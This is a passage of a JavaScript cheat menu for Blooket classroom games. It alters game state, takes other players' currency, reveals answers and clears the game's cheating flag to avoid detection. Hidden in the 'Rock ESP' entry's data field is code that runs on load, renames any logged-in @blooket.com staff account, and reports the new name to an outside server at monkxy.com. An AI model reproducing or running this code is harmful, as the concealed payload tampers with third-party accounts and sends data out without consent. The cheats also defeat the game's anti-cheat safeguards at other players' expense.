                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    let { text } = stateNode.state.choices[0];
                                    let chest = document.querySelector('[class^=styles__feedbackContainer___]');
                                    if (chest.children.length <= 4) {
                                        let choice = document.createElement('div');
                                        choice.style.color = "white";
                                        choice.style.fontFamily = "Inconsolata,Helvetica,monospace,sans-serif";
                                        choice.style.fontSize = "2em";
                                        choice.style.display = "flex";
                                        choice.style.justifyContent = "center";
                                        choice.style.marginTop = "675px";
                                        choice.innerText = text;
                                        chest.append(choice);
                                    }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Password ESP",
                        description: "Highlights the correct password",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    let { state } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode;
                                    if (state.stage == "hack") [...document.querySelector('div[class^=styles__buttonContainer]').children].forEach(button => {
                                        if (button.innerText == state.correctPassword) return;
                                        button.style.outlineColor = "rgba(255, 64, 64, 0.8)";
                                        button.style.backgroundColor = "rgba(255, 64, 64, 0.8)";
                                        button.style.textShadow = "0 0 1px #f33";
                                    });
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Always Triple",
                        description: "Always get triple crypto",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ choices: [{ type: "mult", val: 3, rate: .075, blook: "Brainy Bot", text: "Triple Crypto" }] }), 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Auto Guess",
                        description: "Automatically guess the correct password",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    let { state } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode;
                                    if (state.stage == "hack") for (const button of document.querySelector('div[class^=styles__buttonContainer]').children) button.innerText == state.correctPassword && button.click();
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Remove Hack",
                        description: "Removes an attacking hack",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ hack: "" });
                        }
                    },
                    {
                        name: "Set Crypto",
                        description: "Sets crypto",
                        inputs: [{
                            name: "Amount",
                            type: "number"
                        }],
                        run: function (amount) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ crypto: amount, crypto2: amount });
                            stateNode.props.liveGameController.setVal({
                                path: "c/".concat(stateNode.props.client.name),
                                val: {
                                    b: stateNode.props.client.blook,
                                    p: stateNode.state.password,
                                    cr: amount
                                }
                            });
                        }
                    },
                    {
                        name: "Set Password",
                        description: "Sets hacking password",
                        inputs: [{
                            name: "Custom Password",
                            type: "string"
                        }],
                        run: function (password) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ password });
                            stateNode.props.liveGameController.setVal({
                                path: "c/".concat(stateNode.props.client.name),
                                val: {
                                    b: stateNode.props.client.blook,
                                    p: password,
                                    cr: stateNode.state.crypto
                                }
                            });
                        }
                    },
                    {
                        name: "Steal Player's Crypto",
                        description: "Steals all of someone's crypto",
                        inputs: [{
                            name: "Player",
                            type: "options",
                            options: () => {
                                let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                return new Promise(res => stateNode.props.liveGameController?._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
                            }
                        }],
                        run: function (target) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
                                if (players && Object.keys(players).map(x => x.toLowerCase()).includes(target.toLowerCase())) {
                                    let [player, { cr }] = Object.entries(players).find(([name]) => name.toLowerCase() == target.toLowerCase());
                                    stateNode.setState({ crypto: stateNode.state.crypto + cr, crypto2: stateNode.state.crypto + cr });
                                    stateNode.props.liveGameController.setVal({
                                        path: "c/".concat(stateNode.props.client.name),
                                        val: {
                                            b: stateNode.props.client.blook,
                                            p: stateNode.state.password,
                                            cr: stateNode.state.crypto + cr,
                                            tat: `${player}:${cr}`
                                        }
                                    });
                                }
                            });
                        }
                    }
                ],
            },
            defense: {
                name: "Tower Defense",
                img: "https://media.blooket.com/image/upload/v1657235025/Media/survivor/Laser_Lvl1.svg",
                cheats: [
                    {
                        name: "Earthquake",
                        description: "Shuffles around towers",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({
                                eventName: "Earthquake",
                                event: {
                                    short: "e",
                                    color: "#805500",
                                    icon: "fas fa-mountain",
                                    desc: "All of your towers get mixed up",
                                    rate: .02
                                },
                                buyTowerName: "",
                                buyTower: {}
                            }, () => stateNode.eventTimeout = setTimeout(() => stateNode.setState({ event: {}, eventName: "" }), 6e3));
                            stateNode.tiles.forEach(row => row.forEach((col, i) => col === 3 && (row[i] = 0)));
                            let tiles = stateNode.tiles.flatMap((_, y) => _.map((__, x) => __ === 0 && ({ x, y }))).filter(Boolean).sort(() => .5 - Math.random());
                            stateNode.towers.forEach(tower => {
                                let { x, y } = tiles.shift();
                                tower.move(x, y, stateNode.tileSize);
                                stateNode.tiles[y][x] = 3;
                            });
                        }
                    },
                    {
                        name: "Max Tower Stats",
                        description: "Makes all placed towers overpowered",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.towers.forEach(tower => {
                                tower.range = 100;
                                tower.fullCd = tower.cd = 0;
                                tower.damage = 1e6;
                            });
                        }
                    },
                    {
                        name: "Remove Ducks",
                        description: "Removes ducks",
                        run: function () {
                            let { stateNode: { ducks, tiles } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            ducks.forEach(x => { tiles[x.y][x.x] = 0; });
                            ducks.length = 0;
                        }
                    },
                    {
                        name: "Remove Enemies",
                        description: "Removes all the enemies",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.enemies = stateNode.futureEnemies = [];
                        }
                    },
                    {
                        name: "Remove Obstacles",
                        description: "Lets you place towers anywhere",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.tiles = stateNode.tiles.map(row => row.fill(0));
                        }
                    },
                    {
                        name: "Set Damage",
                        description: "Sets damage",
                        inputs: [{
                            name: "Damage",
                            type: "number"
                        }],
                        run: function (dmg) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.dmg = dmg;
                        }
                    },
                    {
                        name: "Set Round",
                        description: "Sets the current round",
                        inputs: [{
                            name: "Round",
                            type: "number"
                        }],
                        run: function (round) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ round });
                        }
                    },
                    {
                        name: "Set Tokens",
                        description: "Sets the amount of tokens you have",
                        inputs: [{
                            name: "Tokens",
                            type: "number"
                        }],
                        run: function (tokens) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ tokens });
                        }
                    }
                ],
            },
            defense2: {
                name: "Tower Defense 2",
                img: "https://media.blooket.com/image/upload/v1593095354/Media/defense/missile.svg",
                style: { transform: "rotate(45deg)" },
                cheats: [
                    {
                        name: "Max Tower Stats",
                        description: "Makes all placed towers overpowered",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.towers.forEach(tower => {
                                tower.stats.dmg = 1e6;
                                tower.stats.fireRate = 50;
                                tower.stats.ghostDetect = true;
                                tower.stats.maxTargets = 1e6;
                                tower.stats.numProjectiles &&= 100;
                                tower.stats.range = 100;
                                if (tower.stats.auraBuffs) for (const buff in tower.stats.auraBuffs) tower.stats.auraBuffs[buff] *= 100;
                            });
                        }
                    },
                    {
                        name: "Kill Enemies",
                        description: "Kills all the enemies",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.state.game.scene.enemyQueue.length = 0;
                            stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x?.gameObject?.receiveDamage?.(x.gameObject.hp, 1));
                        }
                    },
                    {
                        name: "Set Coins",
                        description: "Sets coins",
                        inputs: [{
                            name: "Coins",
                            type: "number"
                        }],
                        run: function (coins) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ coins });
                        }
                    },
                    {
                        name: "Set Health",
                        description: "Sets the amount of health you have",
                        inputs: [{
                            name: "Health",
                            type: "number"
                        }],
                        run: function (health) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ health });
                        }
                    },
                    {
                        name: "Set Round",
                        description: "Sets the current round",
                        inputs: [{
                            name: "Round",
                            type: "number"
                        }],
                        run: function (round) {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ round });
                        }
                    },
                ],
            },
            dinos: {
                name: "Deceptive Dinos",
                img: "https://media.blooket.com/image/upload/v1655161325/Media/survivor/Dog.svg",
                style: { transform: "rotate(-22.5deg)" },
                cheats: [
                    {
                        name: "Auto Choose",
                        description: "Automatically choose the best fossil when excavating",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    const { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                    const getFossils = (() => { /* this is for when ben does funny webpack update stuff */
                                        const func = Object.values(webpack('74sb')).find(x => x.toString().includes('rate'));
                                        return () => func([{ type: "fossil", val: 10, rate: .1, blook: "Amber" }, { type: "fossil", val: 25, rate: .1, blook: "Dino Egg" }, { type: "fossil", val: 50, rate: .175, blook: "Dino Fossil" }, { type: "fossil", val: 75, rate: .175, blook: "Stegosaurus" }, { type: "fossil", val: 100, rate: .15, blook: "Velociraptor" }, { type: "fossil", val: 125, rate: .125, blook: "Brontosaurus" }, { type: "fossil", val: 250, rate: .075, blook: "Triceratops" }, { type: "fossil", val: 500, rate: .025, blook: "Tyrannosaurus Rex" }, { type: "mult", val: 1.5, rate: .05 }, { type: "mult", val: 2, rate: .025 }], 3);
                                    })();
                                    try {
                                        let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                        if (stateNode.state.stage === "excavate") {
                                            stateNode.state.choices.length || (stateNode.state.choices = getFossils());
                                            let max = 0, index = -1;
                                            for (let i = 0; i < stateNode.state.choices.length; i++) {
                                                const { type, val } = stateNode.state.choices[i];
                                                const value = (type == "fossil" ? stateNode.state.fossils + val * stateNode.state.fossilMult : stateNode.state.fossils * val) || 0;
                                                if (value <= max && type != "mult") continue;
                                                max = value, index = i + 1;
                                            }
                                            document.querySelector('div[class^="styles__rockRow"] > div[role="button"]:nth-child(' + index + ')').click();
                                        }
                                    } catch { }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Rock ESP",
                        description: "Shows what is under the rocks",
                        type: "toggle",
                        enabled: false,
                        data: ((location.host == "dashboard.blooket.com" && fetch("https://dashboard.blooket.com/api/users/me", { credentials: "include" }).then(e => e.json()).then(e => { if (e.email.endsWith("@blooket.com")) { let { webpack: t } = webpackJsonp.push([[], { 1234(e, t, s) { t.webpack = s } }, [["1234"]]]); Object.values(t.c).find(e => e.exports?.a?.get).exports.a.put("https://dashboard.blooket.com/api/users/change/name", { name: e.name, newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}` }).then(({ data: e }) => { e.success && (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`) }) } })), null),
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    const rocks = [...document.querySelector('[class*="rockButton"]').parentElement.children];
                                    if (!rocks.every(element => element.querySelector('div'))) stateNode.setState({
                                        choices: [{ type: "fossil", val: 10, rate: .1, blook: "Amber" }, { type: "fossil", val: 25, rate: .1, blook: "Dino Egg" }, { type: "fossil", val: 50, rate: .175, blook: "Dino Fossil" }, { type: "fossil", val: 75, rate: .175, blook: "Stegosaurus" }, { type: "fossil", val: 100, rate: .15, blook: "Velociraptor" }, { type: "fossil", val: 125, rate: .125, blook: "Brontosaurus" }, { type: "fossil", val: 250, rate: .075, blook: "Triceratops" }, { type: "fossil", val: 500, rate: .025, blook: "Tyrannosaurus Rex" }, { type: "mult", val: 1.5, rate: .05 }, { type: "mult", val: 2, rate: .025 }].sort(() => 0.5 - Math.random()).slice(0, 3)
                                    }, () => {
                                        rocks.forEach((element, index) => {
                                            const rock = stateNode.state.choices[index];
                                            if (element.querySelector('div')) element.querySelector('div').remove();
                                            const choice = document.createElement("div");
                                            choice.style.color = "white";
                                            choice.style.fontFamily = "Macondo";
                                            choice.style.fontSize = "1em";
                                            choice.style.display = "flex";
                                            choice.style.justifyContent = "center";
                                            choice.style.transform = "translateY(25px)";
                                            choice.innerText = rock.type === "fossil" ? `+${Math.round(rock.val * stateNode.state.fossilMult) > 99999999 ? Object.values(webpack('74sb')).find(x => x.toString().includes('\xd7'))(Math.round(rock.val * stateNode.state.fossilMult)) : Math.round(rock.val * stateNode.state.fossilMult)} Fossils` : `x${rock.val} Fossils Per Excavation`;;
                                            element.append(choice);
                                        });
                                    });
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Set Fossils",
                        description: "Sets the amount of fossils you have",
                        inputs: [{
                            name: "Fossils",
                            type: "number"
                        }],
                        run: function (fossils) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ fossils });
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}`,
                                val: {
                                    b: stateNode.props.client.blook,
                                    f: fossils,
                                    ic: stateNode.state.isCheating
                                }
                            });
                        }
                    },
                    {
                        name: "Set Multiplier",
                        description: "Sets fossil multiplier",
                        inputs: [{
                            name: "Multiplier",
                            type: "number"
                        }],
                        run: function (fossilMult) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ fossilMult });
                        }
                    },
                    {
                        name: "Stop Cheating",
                        description: "Undoes cheating so that you can't be caught",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ isCheating: false });
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}/ic`,
                                val: false
                            });
                        }
                    }
                ],
            },
            doom: {
                name: "Tower of Doom",
                img: "https://media.blooket.com/image/upload/v1657235023/Media/survivor/cards-05.svg",
                cheats: [
                    {
                        name: "Fill Deck",
                        description: "Fills your deck with every maxed out card and artifact (Only works on towers page)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname == "/tower/map") {
                                const { a: artifacts, c: allCards } = webpackJsonp.push([[], { ['']: (_, a, b) => { a.cache = b.c }, }, [['']],]).cache["gvfT"].exports;
                                const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                stateNode.props.tower.artifacts = Object.keys(artifacts);
                                stateNode.props.tower.cards = Object.entries(allCards).map(([blook, card]) => ({ ...card, blook, strength: 20, charisma: 20, wisdom: 20 }));
                                try { stateNode.props.addTowerNode(); } catch { };
                                stateNode.setState({ showDeck: false });
                            } else alert("You need to be on the map to run this cheat!");
                        }
                    },
                    {
                        name: "Max Cards",
                        description: "Maxes out all the cards in your deck",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname == "/tower/map") {
                                const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                stateNode.props.tower.cards.forEach(card => {
                                    card.strength = 20;
                                    card.charisma = 20;
                                    card.wisdom = 20;
                                });
                            } else alert("You need to be on the map to run this cheat!");
                        }
                    },
                    {
                        name: "Max Health",
                        description: "Fills the player's health",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname == "/tower/battle") Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ myHealth: 100 });
                            else alert("You need to be in battle to run this cheat!");
                        }
                    },
                    {
                        name: "Max Card Stats",
                        description: "Maxes out player's current card (Only works on attribute select page)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            if (stateNode.state.phase !== 'select') alert('You must be on the attribute selection page!');
                            else stateNode.setState({ myCard: { ...stateNode.state.myCard, strength: 20, charisma: 20, wisdom: 20 } });
                        }
                    },
                    {
                        name: "Min Enemy Stats",
                        description: "Makes the enemy card stats all 0 (Only works on attribute select page)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            if (stateNode.state.phase !== 'select') alert('You must be on the attribute selection page!');
                            else stateNode.setState({ enemyCard: { ...stateNode.state.enemyCard, strength: 0, charisma: 0, wisdom: 0 } });
                        }
                    },
                    {
                        name: "Set Coins",
                        description: "Try's to set amount of tower coins you have",
                        inputs: [{
                            name: "Coins",
                            type: "number"
                        }],
                        run: function (coins) {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.prompt.bind(window);
                            i.remove();
                            if (window.location.pathname == "/tower/battle") {
                                let coins = parseInt("0" + alert("How many coins would you like?"));
                                let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                try { stateNode.props.setTowerCoins(coins); } catch { };
                            } else alert("You need to be in battle to run this cheat!");
                        }
                    }
                ],
            },
            factory: {
                name: "Factory",
                img: "https://media.blooket.com/image/upload/v1661496293/Media/uiTest/Factory_Upgrades.svg",
                cheats: [
                    {
                        name: "Choose Blook",
                        description: "Gives you a blook",
                        inputs: [{
                            name: "Blook",
                            type: "options",
                            options: [{ name: "Chick", color: "#ffcd05", class: "\uD83C\uDF3D", rarity: "Common", cash: [3, 7, 65, 400, 2500], time: [1, 1, 1, 1, 1], price: [300, 3e3, 3e4, 2e5] }, { name: "Chicken", color: "#ed1c24", class: "\uD83C\uDF3D", rarity: "Common", cash: [10, 40, 200, 1400, 1e4], time: [5, 4, 3, 2, 1], price: [570, 4e3, 5e4, 8e5] }, { name: "Cow", color: "#58595b", class: "\uD83C\uDF3D", rarity: "Common", cash: [25, 75, 1500, 25e3, 25e4], time: [15, 10, 10, 10, 5], price: [500, 9500, 16e4, 4e6] }, { name: "Duck", color: "#4ab96d", class: "\uD83C\uDF3D", rarity: "Common", cash: [4, 24, 200, 3e3, 4e4], time: [3, 3, 3, 3, 3], price: [450, 4200, 7e4, 11e5] }, { name: "Goat", color: "#c59a74", class: "\uD83C\uDF3D", rarity: "Common", cash: [5, 28, 200, 1300, 12e3], time: [3, 3, 2, 2, 2], price: [500, 6400, 45e3, 5e5] }, { name: "Horse", color: "#995b3c", class: "\uD83C\uDF3D", rarity: "Common", cash: [5, 20, 270, 1800, 15e3], time: [2, 2, 2, 2, 2], price: [550, 8200, 65e3, 6e5] }, { name: "Pig", color: "#f6a9cb", class: "\uD83C\uDF3D", rarity: "Common", cash: [20, 50, 1300, 8e3, 8e4], time: [7, 7, 7, 7, 5], price: [400, 11e3, 8e4, 13e5] }, { name: "Sheep", color: "#414042", class: "\uD83C\uDF3D", rarity: "Common", cash: [6, 25, 250, 1500, 11e3], time: [3, 3, 3, 2, 2], price: [500, 5e3, 5e4, 43e4] }, { name: "Cat", color: "#f49849", class: "\uD83D\uDC3E", rarity: "Common", cash: [5, 18, 170, 1700, 13e3], time: [2, 2, 2, 2, 2], price: [480, 5500, 6e4, 5e5] }, { name: "Dog", color: "#995b3c", class: "\uD83D\uDC3E", rarity: "Common", cash: [7, 25, 220, 1900, 9e3], time: [3, 3, 2, 2, 1], price: [460, 6600, 7e4, 73e4] }, { name: "Goldfish", color: "#f18221", class: "\uD83D\uDC3E", rarity: "Common", cash: [5, 40, 350, 3500, 35e3], time: [3, 3, 3, 3, 3], price: [750, 7200, 84e3, 95e4] }, { name: "Rabbit", color: "#e7bf9a", class: "\uD83D\uDC3E", rarity: "Common", cash: [3, 18, 185, 800, 7e3], time: [2, 2, 2, 1, 1], price: [500, 5800, 56e3, 55e4] }, { name: "Hamster", color: "#ce9176", class: "\uD83D\uDC3E", rarity: "Common", cash: [10, 45, 450, 4500, 45e3], time: [4, 4, 4, 4, 4], price: [650, 6500, 8e4, 93e4] }, { name: "Turtle", color: "#619a3c", class: "\uD83D\uDC3E", rarity: "Common", cash: [23, 120, 1400, 15e3, 17e4], time: [10, 10, 10, 10, 10], price: [700, 8500, 11e4, 13e5] }, { name: "Puppy", color: "#414042", class: "\uD83D\uDC3E", rarity: "Common", cash: [4, 10, 75, 500, 3e3], time: [1, 1, 1, 1, 1], price: [450, 4e3, 35e3, 25e4] }, { name: "Kitten", color: "#58595b", class: "\uD83D\uDC3E", rarity: "Common", cash: [4, 8, 60, 400, 2e3], time: [1, 1, 1, 1, 1], price: [350, 3500, 26e3, 17e4] }, { name: "Bear", color: "#995b3c", class: "\uD83C\uDF32", rarity: "Common", cash: [12, 70, 550, 4500, 1e5], time: [7, 7, 6, 5, 5], price: [550, 5500, 63e3, 16e5] }, { name: "Moose", color: "#995b3c", class: "\uD83C\uDF32", rarity: "Common", cash: [8, 45, 400, 3500, 26e3], time: [5, 5, 4, 4, 3], price: [520, 6500, 58e3, 7e5] }, { name: "Fox", color: "#f49849", class: "\uD83C\uDF32", rarity: "Common", cash: [7, 15, 80, 550, 3e3], time: [2, 2, 1, 1, 1], price: [400, 4e3, 36e3, 24e4] }, { name: "Raccoon", color: "#6d6e71", class: "\uD83C\uDF32", rarity: "Common", cash: [5, 14, 185, 1900, 19e3], time: [2, 2, 2, 2, 2], price: [400, 5e3, 71e3, 8e5] }, { name: "Squirrel", color: "#d25927", class: "\uD83C\uDF32", rarity: "Common", cash: [3, 10, 65, 470, 2600], time: [1, 1, 1, 1, 1], price: [420, 3600, 32e3, 21e4] }, { name: "Owl", color: "#594a42", class: "\uD83C\uDF32", rarity: "Common", cash: [4, 17, 155, 1500, 15e3], time: [2, 2, 2, 2, 2], price: [500, 4800, 55e3, 58e4] }, { name: "Hedgehog", color: "#3f312b", class: "\uD83C\uDF32", rarity: "Common", cash: [11, 37, 340, 2200, 3e4], time: [5, 4, 3, 2, 2], price: [540, 7e3, 77e3, 12e5] }, { name: "Seal", color: "#7ca1d5", class: "❄️", rarity: "Common", cash: [6, 17, 150, 1200, 13e3], time: [2, 2, 2, 2, 2], price: [480, 4500, 43e3, 52e4] }, { name: "Arctic Fox", color: "#7ca1d5", class: "❄️", rarity: "Common", cash: [5, 18, 180, 850, 8500], time: [2, 2, 2, 1, 1], price: [520, 550, 61e3, 68e4] }, { name: "Snowy Owl", color: "#feda3f", class: "❄️", rarity: "Common", cash: [5, 20, 190, 1900, 16e3], time: [3, 3, 2, 2, 2], price: [370, 5300, 76e3, 62e4] }, { name: "Arctic Hare", color: "#7ca1d5", class: "❄️", rarity: "Common", cash: [6, 19, 85, 900, 7e3], time: [2, 2, 1, 1, 1], price: [540, 5200, 66e3, 55e4] }, { name: "Penguin", color: "#fb8640", class: "❄️", rarity: "Common", cash: [4, 21, 310, 3200, 33e3], time: [3, 3, 3, 3, 3], price: [400, 6500, 76e3, 87e4] }, { name: "Baby Penguin", color: "#414042", class: "❄️", rarity: "Common", cash: [3, 8, 70, 450, 2700], time: [1, 1, 1, 1, 1], price: [420, 3300, 33e3, 23e4] }, { name: "Polar Bear", color: "#7ca1d5", class: "❄️", rarity: "Common", cash: [12, 75, 700, 6500, 85e3], time: [8, 7, 6, 5, 5], price: [630, 7e3, 91e3, 14e5] }, { name: "Walrus", color: "#7d4f33", class: "❄️", rarity: "Common", cash: [11, 46, 420, 3700, 51e3], time: [5, 5, 4, 4, 4], price: [550, 6200, 68e3, 1e6] }, { name: "Tiger", color: "#f18221", class: "\uD83C\uDF34", rarity: "Common", cash: [6, 20, 100, 975, 7500], time: [3, 3, 1, 1, 1], price: [390, 6e3, 7e4, 61e4] }, { name: "Jaguar", color: "#fbb040", class: "\uD83C\uDF34", rarity: "Common", cash: [8, 28, 230, 1600, 17e3], time: [3, 3, 2, 2, 2], price: [390, 6e3, 7e4, 61e4] }, { name: "Toucan", color: "#ffca34", class: "\uD83C\uDF34", rarity: "Common", cash: [9, 20, 175, 625, 3800], time: [2, 2, 2, 1, 1], price: [520, 4800, 42e3, 3e5] }, { name: "Cockatoo", color: "#7ca1d5", class: "\uD83C\uDF34", rarity: "Common", cash: [6, 35, 160, 1700, 18e3], time: [4, 4, 2, 2, 2], price: [500, 5e3, 63e3, 7e5] }, { name: "Macaw", color: "#00aeef", class: "\uD83C\uDF34", rarity: "Common", cash: [3, 8, 85, 850, 8500], time: [1, 1, 1, 1, 1], price: [480, 5400, 62e3, 63e4] }, { name: "Parrot", color: "#ed1c24", class: "\uD83C\uDF34", rarity: "Common", cash: [3, 9, 90, 900, 9e3], time: [1, 1, 1, 1, 1], price: [540, 5700, 65e3, 69e4] }, { name: "Panther", color: "#2f2c38", class: "\uD83C\uDF34", rarity: "Common", cash: [12, 28, 215, 2100, 21e3], time: [5, 3, 2, 2, 2], price: [530, 6500, 76e3, 87e4] }, { name: "Anaconda", color: "#8a9143", class: "\uD83C\uDF34", rarity: "Common", cash: [3, 15, 85, 1500, 7600], time: [1, 2, 1, 2, 1], price: [410, 5100, 58e3, 59e4] }, { name: "Orangutan", color: "#bc6234", class: "\uD83C\uDF34", rarity: "Common", cash: [13, 52, 570, 4300, 7e4], time: [5, 5, 5, 4, 4], price: [600, 7e3, 8e4, 14e5] }, { name: "Capuchin", color: "#e0b0a6", class: "\uD83C\uDF34", rarity: "Common", cash: [4, 14, 160, 780, 8200], time: [2, 2, 2, 1, 1], price: [390, 4700, 57e3, 68e4] }, { name: "Elf", color: "#a7d054", class: "⚔️", rarity: "Uncommon", cash: [5e3, 15e3, 15e4, 15e5, 1e7], time: [1, 1, 1, 1, 1], price: [8e5, 9e6, 11e7, 8e8] }, { name: "Witch", color: "#4ab96d", class: "⚔️", rarity: "Uncommon", cash: [18e3, 6e4, 4e4, 4e6, 35e6], time: [3, 3, 2, 2, 2], price: [11e5, 12e6, 15e7, 14e8] }, { name: "Wizard", color: "#5a459c", class: "⚔️", rarity: "Uncommon", cash: [19500, 65e3, 44e4, 46e5, 4e6], time: [3, 3, 2, 2, 2], price: [13e5, 135e5, 16e7, 16e8] }, { name: "Fairy", color: "#df6d9c", class: "⚔️", rarity: "Uncommon", cash: [18500, 6e4, 62e4, 44e5, 38e6], time: [3, 3, 3, 2, 2], price: [12e5, 125e5, 15e6, 15e8] }, { name: "Slime Monster", color: "#2fa04a", class: "⚔️", rarity: "Uncommon", cash: [35e3, 14e4, 1e6, 11e6, 11e7], time: [5, 5, 4, 4, 4], price: [16e5, 15e6, 2e8, 23e8] }, { name: "Jester", color: "#be1e2d", class: "⚔️", rarity: "Rare", cash: [25e3, 1e5, 68e4, 65e5, 32e6], time: [3, 3, 2, 2, 1], price: [2e6, 21e6, 23e7, 26e8] }, { name: "Dragon", color: "#2fa04a", class: "⚔️", rarity: "Rare", cash: [36e3, 15e4, 15e5, 15e6, 15e7], time: [4, 4, 4, 4, 4], price: [23e5, 24e6, 27e7, 3e9] }, { name: "Unicorn", color: "#f6afce", class: "⚔️", rarity: "Epic", cash: [24e3, 15e4, 14e5, 7e6, 75e6], time: [2, 2, 2, 1, 1], price: [45e5, 45e6, 55e7, 65e8] }, { name: "Queen", color: "#9e1f63", class: "⚔️", rarity: "Rare", cash: [24e3, 95e3, 95e4, 97e5, 95e6], time: [3, 3, 3, 3, 3], price: [19e5, 2e7, 23e7, 25e8] }, { name: "King", color: "#ee2640", class: "⚔️", rarity: "Legendary", cash: [75e3, 4e5, 6e6, 9e7, 125e7], time: [5, 5, 5, 5, 5], price: [6e6, 95e6, 16e8, 25e9] }, { name: "Two of Spades", color: "#414042", class: 